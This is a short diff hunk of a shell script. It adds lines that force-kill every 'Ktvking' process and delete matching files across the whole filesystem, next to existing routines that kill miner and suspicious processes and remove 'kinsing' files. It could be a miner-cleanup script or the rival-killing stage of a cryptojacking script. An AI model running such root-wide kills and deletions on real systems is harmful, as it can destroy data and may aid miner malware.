@@ -684,6 +684,13 @@ kill_miner_proc
 kill_sus_proc
 rm -f kinsing kdevtmpfsi
 
+pids=$(pgrep Ktvking)
+for pid in $pids; do
+  kill -9 $pid
+done
+
+find / -name "Ktvking" -type f -delete
+
 # Cleaning system
 sync && echo 3 >/proc/sys/vm/dro
 
